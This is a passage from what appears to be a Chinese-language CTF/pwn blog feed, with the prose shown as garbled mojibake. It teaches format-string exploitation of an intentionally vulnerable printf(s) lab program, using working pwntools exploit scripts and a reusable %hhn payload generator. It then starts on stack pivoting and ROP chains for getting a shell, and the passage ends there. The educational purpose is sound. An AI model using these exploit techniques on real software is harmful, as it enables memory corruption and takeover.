class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><span class="hljs-type">int</span> a=<span class="hljs-number">123</span>,b=<span class="hljs-number">456</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> c=<span class="hljs-number">789</span>;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;c);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,s);<br>    <span class="hljs-built_in">printf</span>(s);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>     &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <br>&#125;<br></code></pre></td></tr></table></figure><p>æ— è®ºè¦†ç›–ä»€ä¹ˆåœ°å€çš„å˜é‡ï¼Œæˆ‘ä»¬éƒ½æ˜¯æ„é€ ç±»ä¼¼å¦‚ä¸‹çš„payload:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[padding][overwrite addr]%[overwrite offset]$n<br></code></pre></td></tr></table></figure><p>payloadéœ€è¦å†™çš„æ•°æ®ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦è¦†ç›–å†…å­˜çš„æ­¥éª¤ï¼š</p><ul><li>ç¡®å®šè¦†ç›–çš„åœ°å€</li><li>ç¡®å®šè¦è¦†ç›–çš„å˜é‡çš„ç›¸å¯¹åç§»</li><li>è¿›è¡Œè¦†ç›–</li></ul><h5 id="ç¡®å®šè¦†ç›–åœ°å€"><a href="#ç¡®å®šè¦†ç›–åœ°å€" class="headerlink" title="ç¡®å®šè¦†ç›–åœ°å€"></a>ç¡®å®šè¦†ç›–åœ°å€</h5><p>åœ¨è¿™é‡Œæˆ‘ä»¬è®¾è®¡ç¨‹åºç›´æ¥è¾“å‡ºäº†æ ˆå˜é‡Cçš„åœ°å€ã€‚åœ¨å®é™…è¿ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶å®ƒæ–¹æ³•è·å–ç›¸åº”åœ°å€ã€‚</p><h5 id="ç¡®å®šç›¸å¯¹åç§»-1"><a href="#ç¡®å®šç›¸å¯¹åç§»-1" class="headerlink" title="ç¡®å®šç›¸å¯¹åç§»"></a>ç¡®å®šç›¸å¯¹åç§»</h5><p>åˆ©ç”¨ä¸Šé¢è®²è¿‡çš„ç®€å•ç²—æš´çš„æ–¹æ³•è¿›è¡Œæ“ä½œï¼Œç¡®å®šæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">$ ./overflow<br><span class="hljs-number">0xff8f615c</span><br>AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p  <span class="hljs-comment">//è¿™é‡Œæ˜¯æˆ‘ä»¬çš„è¾“å…¥</span><br>AAAA,<span class="hljs-number">0xff8f60f8</span>,<span class="hljs-number">0xf7f84410</span>,<span class="hljs-number">0x80484bd</span>,(nil),<span class="hljs-number">0x1</span>,<span class="hljs-number">0x41414141</span>(åœ¨è¿™é‡Œï¼),<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span>,<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span>,<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span><br></code></pre></td></tr></table></figure><h5 id="è¿›è¡Œè¦†ç›–"><a href="#è¿›è¡Œè¦†ç›–" class="headerlink" title="è¿›è¡Œè¦†ç›–"></a>è¿›è¡Œè¦†ç›–</h5><p>æˆ‘ä»¬å·²çŸ¥ç¬¬å…­ä¸ªå‚æ•°å€¼å°±æ˜¯å­˜å‚¨å˜é‡ c çš„åœ°å€åï¼Œä¾¿å¯ä»¥åˆ©ç”¨%nçš„ç‰¹å¾æ¥ä¿®æ”¹ c çš„å€¼å•¦ï¼</p><p>æ ¹æ®ä¸Šé¢è¯´è¿‡çš„ï¼Œæˆ‘ä»¬ç›®æ ‡è¾“å‡º <code>modified c.</code>ï¼Œéœ€è¦æŠŠ c æ”¹ä¸º16ï¼Œåˆ™payload ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[address of c]%012%<span class="hljs-number">6</span>$n  <br></code></pre></td></tr></table></figure><p>æœ€ç»ˆçš„expè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>addr_c=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr_c)<br><br>payload=p32(addr_c)+<span class="hljs-string">b&#x27;%012d&#x27;</span>+<span class="hljs-string">b&#x27;%6$n&#x27;</span>  <br><span class="hljs-comment">#[address of c]%012%6$n   addr of c çš„é•¿åº¦ä¸º 4ï¼Œæ•…è€Œæˆ‘ä»¬å¾—å†è¾“å…¥12ä¸ªå­—ç¬¦æ‰å¯ä»¥è¾¾åˆ°16ä¸ªå­—ç¬¦</span><br><span class="hljs-built_in">print</span> payload<br><span class="hljs-comment">#gdb.attach(p,&quot;break printf&quot;)</span><br>p.sendline(payload)<br><br><span class="hljs-built_in">print</span> p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æœ€åè¿è¡Œç»“æœ</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show.png"></p><h4 id="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"><a href="#è¦†ç›–ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"></a>è¦†ç›–ä»»æ„åœ°å€å†…å­˜</h4><h5 id="è¦†ç›–å°æ•°å­—"><a href="#è¦†ç›–å°æ•°å­—" class="headerlink" title="è¦†ç›–å°æ•°å­—"></a>è¦†ç›–å°æ•°å­—</h5><p>æŒ‰ç…§æˆ‘ä»¬ä¸Šé¢è®²è¿‡çš„payloadå¤§è‡´æ ¼å¼ï¼Œéœ€è¦åœ¨è¾“å…¥å†…å®¹ä¹‹å‰å‰ç¼€å°†è¦è¦†ç›–çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°†ä¼šå ç”¨æœºå™¨å­—é•¿ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½è¦†ç›–çš„æœ€å°å€¼å°±æ˜¯4å­—èŠ‚æˆ–è€…8å­—èŠ‚ï¼Œå½“æˆ‘ä»¬æƒ³è¦ä¿®æ”¹å˜dataå˜é‡ä¸ºå°äºæœºå™¨å­—é•¿çš„æ•°å€¼æ—¶è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥ä¸æŠŠå˜é‡çš„åœ°å€æ”¾åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‰é¢ã€‚æˆ‘ä»¬å½“æ—¶å¯»æ‰¾åç§»æŠŠ tag æ”¾åœ¨å­—ç¬¦ä¸²çš„æœ€å‰é¢æ˜¯å› ä¸ºè¿™æ ·æ¯”è¾ƒæ–¹ä¾¿ç›´è§‚ï¼Œå¦‚æœæˆ‘ä»¬æŠŠ tag æ”¾åœ¨ä¸­é—´ï¼Œå…¶å®ä¹Ÿä¸å½±å“ï¼Œå¦‚ä¸‹ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">%p,%p,AAAA,%p,%p,%p,%p,%p,%p        <br><span class="hljs-number">0xffe2c948</span>,<span class="hljs-number">0xf7fa1410</span>,AAAA,<span class="hljs-number">0x80484bd</span>,(nil),<span class="hljs-number">0x10</span>,x70257025,<span class="hljs-number">0x41414141</span>,<span class="hljs-number">0x70257025</span><br></code></pre></td></tr></table></figure><p> åŒæ ·ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå¸Œæœ›è¦†ç›–çš„çš„åœ°å€å†™åœ¨åé¢ï¼Œå¯¹åº”çš„æˆ‘ä»¬è¦å°†%nçš„å‚æ•°è¿›è¡Œç›¸åº”çš„ä¿®æ”¹ã€‚åŒæ—¶æˆ‘ä»¬æƒ³è¦å°†aè¦†ç›–æˆ2ï¼Œå°±å¯ä»¥å†™æˆä¸‹é¢çš„å½¢å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">aa%k$n[padding][addr of a]  <span class="hljs-comment">//padding ç”¨æ¥å¡«å……å¯¹é½æœºå™¨å­—èŠ‚</span><br></code></pre></td></tr></table></figure><p>æœ€åçš„expä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>addr_a=<span class="hljs-number">0x0804A024</span><br><br>payload=<span class="hljs-string">b&#x27;aa%8$naa&#x27;</span>+p32(addr_a)  <span class="hljs-comment">#b&#x27;aa%8$naa&#x27;å 8å­—èŠ‚ä¹Ÿå°±æ˜¯ä¸¤ä¸ªå˜é‡çš„é•¿åº¦ï¼Œæ‰€ä»¥åœ°å€ç›¸åº”åæ¨ä¸¤ä½å°±æ˜¯æ”¾åœ¨ç¬¬8ä¸ªå˜é‡çš„ä½ç½®</span><br>p.sendline(payload)<br><br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„ç»“æœæ˜¯ï¼š<br><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show2.png"></p><h5 id="è¦†ç›–å¤§æ•°å­—"><a href="#è¦†ç›–å¤§æ•°å­—" class="headerlink" title="è¦†ç›–å¤§æ•°å­—"></a>è¦†ç›–å¤§æ•°å­—</h5><p>åœ¨å‰é¢è¯´è¿‡ï¼Œå¦‚æœä¸€æ¬¡æ€§è¾“å‡ºå¤§æ•°å­—ä¸ªå­—èŠ‚æ¥è¿›è¡Œè¦†ç›–ï¼Œé‚£ä¹ˆç»“æœæˆåŠŸä¸å¦æ˜¯æˆ‘ä»¬ä¸å¯æ§çš„ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ«çš„æ–¹å¼è¿›è¡Œè¦†ç›–ã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡ä½¿ç”¨å…·ä½“çš„å®½åº¦æˆ–ç²¾åº¦çš„è½¬æ¢è§„èŒƒæ¥æ§åˆ¶å†™å…¥çš„å­—ç¬¦ä¸ªæ•°ã€‚åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> c;<br><span class="hljs-type">short</span> s;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">long</span> l;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %hhn\n&quot;</span>, str, &amp;c);       <span class="hljs-comment">// å†™å…¥å•å­—èŠ‚</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %hn\n&quot;</span>, str, &amp;s);        <span class="hljs-comment">// å†™å…¥åŒå­—èŠ‚</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %n\n&quot;</span>, str, &amp;i);         <span class="hljs-comment">// å†™å…¥4å­—èŠ‚</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %ln\n&quot;</span>, str, &amp;l);        <span class="hljs-comment">// å†™å…¥8å­—èŠ‚</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %lln\n&quot;</span>, str, &amp;ll);      <span class="hljs-comment">// å†™å…¥16å­—èŠ‚</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éƒ½çŸ¥é“<strong>åœ¨x86ä¸­å’Œ x64 çš„ä½“ç³»ç»“æ„ä¸­ï¼Œå˜é‡ä»¥å°ç«¯åºå­˜å‚¨</strong>ã€‚åƒé¢˜ç›®ä¸­æ‰€è¦æ±‚çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†bè¦†ç›–ä¸º0x12345678ï¼Œè¿™ä¸ª<code>0x12345678</code> åœ¨å†…å­˜ä¸­åœ°å€ä»ä½åˆ°é«˜å°±æ˜¯ <code>\x78\x56\x34\x12</code>ã€‚åŒæ—¶æˆ‘ä»¬åˆ©ç”¨idaå¾—çŸ¥bçš„åœ°å€æ˜¯ 0x0804A028ã€‚é‚£ä¹ˆæˆ‘ä»¬å¸Œæœ›è¦†ç›–çš„æ–¹å¼å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure><p>åŒç†payloadä¹Ÿè¦æ„é€ ä¸ºåˆ†åˆ«èµ‹å€¼çš„å½¢å¼ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p32(<span class="hljs-number">0x0804A028</span>)+p32(<span class="hljs-number">0x0804A029</span>)+p32(<span class="hljs-number">0x0804A02a</span>)+p32(<span class="hljs-number">0x0804A02b</span>)+pad1+<span class="hljs-string">&#x27;%6$n&#x27;</span>+pad2+<span class="hljs-string">&#x27;%7$n&#x27;</span>+pad3+<span class="hljs-string">&#x27;%8$n&#x27;</span>+pad4+<span class="hljs-string">&#x27;%9$n&#x27;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥é è‡ªå·±çš„åŠªåŠ›ä¸€ä¸€è®¡ç®—ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹æ–¹ç°æˆçš„åŸºæœ¬æ„é€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">prev, word, index</span>):<br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure><p>åªéœ€åœ¨mainå‡½æ•°ä¸­è°ƒç”¨fmt_str()å‡½æ•°ï¼Œå¡«å……ç›¸åº”å˜é‡å³å¯ã€‚</p><p>å…¶ä¸­æ¯ä¸ªå‚æ•°çš„å«ä¹‰åŸºæœ¬å¦‚ä¸‹ï¼š</p><ul><li>offset è¡¨ç¤ºè¦è¦†ç›–çš„åœ°å€æœ€åˆçš„åç§»</li><li>size è¡¨ç¤ºæœºå™¨å­—é•¿</li><li>addr è¡¨ç¤ºå°†è¦è¦†ç›–çš„åœ°å€ã€‚</li><li>target è¡¨ç¤ºæˆ‘ä»¬è¦è¦†ç›–ä¸ºçš„ç›®çš„å˜é‡å€¼ã€‚</li></ul><p>æœ€ç»ˆå¾—åˆ°expï¼šï¼ˆå‡½æ•°æ„é€ ä¹Ÿè¦å†™åœ¨expé‡Œçš„ï¼Œè¿™é‡Œé˜²æ­¢å•°å—¦å°±ä¸å†™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn imort *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br><span class="hljs-built_in">print</span> payload<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>æœ€åç»“æœï¼š</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show3.png"></p><hr><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸºç¡€éƒ¨åˆ†over!ğŸ˜</p><p>æ ¼å¼çš„Lengthéƒ¨åˆ†çœŸçš„æ˜¯èŠ±äº†æˆ‘å¥½ä¹…æ‰ææ˜ç™½ä»€ä¹ˆæ„æ€ï¼Œä¸­æ–‡ç½‘ç«™ä¸Šéƒ½æ˜¯ç›´è¯‘è‹±æ–‡ï¼Œå»è‹±æ–‡ç½‘ç«™ç”¨å°½æ¯•ç”Ÿè‹±è¯­æ‰€å­¦æ‰ææ‡‚ğŸ˜¨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸é‚£ä¹ˆèœèœçš„ROP</title>
    <link href="/2023/07/06/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/07/06/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>æ ˆä¸Šçš„ä¸é‚£ä¹ˆç®€å•å°ç©æ„ä»¬</p><span id="more"></span><h1 id="Stack-pivoting"><a href="#Stack-pivoting" class="headerlink" title="Stack pivoting"></a>Stack pivoting</h1><p>stack pivoting (å †æ ˆè½¬ç§»)ï¼ŒåŸºæœ¬æ€æƒ³æ˜¯åˆ©ç”¨å·²æœ‰çš„å†…å­˜åŒºåŸŸæˆ–æ•°æ®ç»“æ„ï¼ˆä¾‹å¦‚å †ï¼‰æ¥æ„é€ ä¸€ä¸ªæ–°çš„å †æ ˆï¼Œç„¶åå°†ç¨‹åºçš„æ§åˆ¶æµè½¬ç§»åˆ°è¯¥å †æ ˆä¸Šæ‰§è¡Œã€‚é€šè¿‡å°†å †æ ˆæŒ‡é’ˆ (ESP&#x2F;RSP) è®¾ç½®ä¸ºæ–°çš„å †æ ˆåœ°å€ï¼Œå¹¶åœ¨è¯¥å †æ ˆä¸Šæ„é€ åˆé€‚çš„å‡½æ•°è°ƒç”¨å¸§ï¼Œå¯ä»¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ã€‚</p><p>é€šå¸¸åœ¨å†…å­˜å¸ƒå±€å—é™æˆ–æŸäº›ä¿æŠ¤æœºåˆ¶å­˜åœ¨çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚</p><p>åˆ©ç”¨stack pivotingæœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹å¾ï¼š</p><ul><li>æ ˆå¯ä»¥æ§åˆ¶çš„ç©ºé—´è¿‡å°ä¸è¶³ä»¥æ„é€ å®Œæ•´çš„ropé“¾</li><li>å¼€å¯äº† PIE ä¿æŠ¤ï¼Œæ ˆåœ°å€æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°å·²çŸ¥çš„åŒºåŸŸ</li></ul><p>è¯´åˆ°åº•æ ˆè¿ç§»å°±æ˜¯ <code>&#39;a&#39;*offset+p64(fake_stack)+P64(leave)</code></p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£å‡½æ•°åœ¨æ‰§è¡Œç»“æŸåä¼šæ‰§è¡Œçš„ <code>leave;ret</code> è¿™æ¡æ±‡ç¼–ä»£ç çš„å«ä¹‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># leave, ç›¸å½“äºæ‰§è¡Œ<br>mov esp, ebp<br>pop ebp<br><br># retn, ç›¸å½“äºæ‰§è¡Œ<br>pop eip<br><br>#æ‰§è¡ŒleaveæŒ‡ä»¤åï¼Œé¦–å…ˆç»˜å°†ebpçš„å€¼èµ‹ç»™espï¼Œç„¶ååšä¸€ä¸ªå‡ºæ ˆæ“ä½œï¼Œæ ˆæŒ‡é’ˆä¼šå‘æ ˆåº•ç§»åŠ¨ä¸€ä¸ªåœ°å€ã€‚æ­¤æ—¶æ‰§è¡Œretï¼Œå°±ä¼šè·³è½¬åˆ°æ–°çš„æ ˆé¡¶æŒ‡é’ˆçš„åœ°å€ï¼Œå³åŸebp+8å¤„å­˜å‚¨çš„åœ°å€ã€‚<br></code></pre></td></tr></table></figure><p>åœ¨å®é™…çš„ç¨‹åºæ±‡ç¼–ä»£ç ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åˆ©ç”¨å¦‚ä¸‹å›¾æ‰€ç¤ºçš„ä»£ç ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-08-10_15-57-09.png"></p><p><code>rax, [rbp+buf]</code> æˆ‘ä»¬è¦çŸ¥é“è¿™å¥æ±‡ç¼–åœ¨å¹²å˜›ï¼Œå…¶å®å°±æ˜¯æŠŠ rbp+buf çš„åœ°å€ç»™åˆ° raxã€‚æˆ‘ä»¬éƒ½çŸ¥é“æ ˆæº¢å‡ºæ˜¯å…ˆæº¢å‡ºåˆ° rbp å†åˆ° rip çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºçš„æ–¹å¼æ§åˆ¶ rbp çš„å€¼ï¼Œåœ¨ä¸‹é¢åˆå°†ä¼šæŠŠ rax çš„å€¼èµ‹ç»™ rsi ï¼Œé€šè¿‡è¿™æ¡æ±‡ç¼–å‘½ä»¤æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ rbp å’Œ rsi ã€‚</p><p>åƒä¸Šå›¾çš„ä¾‹å­ï¼Œå‡è®¾æˆ‘ä»¬é€šè¿‡æº¢å‡ºæ§åˆ¶äº† rbp ä¸º 0x123000ï¼Œé‚£ä¹ˆ read å‘½ä»¤å°±ç›¸å½“äºåœ¨æ‰§è¡Œ <code>read(0,0x123000+buf,xx)</code> ï¼Œä¹Ÿå°±æ˜¯è¯»å…¥çš„æ•°æ®è¢«å†™å…¥äº† 0x123000ã€‚è‡³æ­¤æˆ‘ä»¬å°±å¯ä»¥å®ç°ä»»æ„åœ°å€çš„å†™å…¥ã€‚</p><p>ä½†æ˜¯è¿™æ ·<strong>åªé€‚ç”¨äºæˆ‘ä»¬åªåˆ©ç”¨ä¸€æ¬¡æ¼æ´çš„æƒ…å†µ</strong>ï¼Œå¦‚æœæˆ‘ä»¬å¤šæ¬¡åˆ©ç”¨æ¼æ´å°±éœ€è¦ä¸ºç¨‹åºå®Œæ•´çš„æ„é€ ä¸€ä¸ªæ ˆç»“æ„ï¼Œå®ç° â€œ æŠŠæ ˆæ¬èµ° â€ ã€‚</p><p>å¤§è‡´çš„é€šç”¨æ€è·¯å°±æ˜¯ï¼š</p><ul><li><p>ç¬¬ä¸€æ¬¡æ ˆè¿ç§»ä¿®æ”¹ rbp è®©æ¥ä¸‹æ¥çš„è¾“å…¥æŒ‡å‘æˆ‘ä»¬æƒ³è¦å†™çš„åœ°æ–¹</p></li><li><p>ç¬¬äºŒæ¬¡æ ˆè¿ç§»ä¿®æ”¹ rsp è®©ç¨‹åºæ­£å¸¸</p></li><li><p>ç¬¬ä¸‰æ¬¡æ ˆè¿ç§»è¿›è¡Œæ”»å‡» rop é“¾çš„æ„é€ ï¼ˆä¾‹å¦‚æ³„éœ² libc ï¼Œä¿®æ”¹ GOT åœ°å€ï¼Œåœ¨æ ˆä¸Šå¸ƒç½® shell rop é“¾ï¼‰</p></li><li><p>ç¬¬å››æ¬¡é‡å¤ç¬¬ä¸€æ¬¡çš„æ“ä½œ</p></li><li><p>ç¬¬äº”æ¬¡æ„é€  getshell rop é“¾</p></li></ul><blockquote><p>å¦‚æœéœ€è¦è¿›è¡Œå¤šæ¬¡ rop æ”»å‡»ï¼Œé™¤äº†æœ€åä¸€æ¬¡éƒ½éœ€è¦é‡å¤ 1ã€2 æ“ä½œæ¢å¤æ ˆç»“æ„</p></blockquote><h4 id="ğŸŒ°-1ï¼š"><a href="#ğŸŒ°-1ï¼š" class="headerlink" title="ğŸŒ°_1ï¼š"></a>ğŸŒ°_1ï¼š</h4><p>å‘ç°äº†ä¸€ä¸ªé¶åœºï¼š<a href="https://ropemporium.com/">ROP 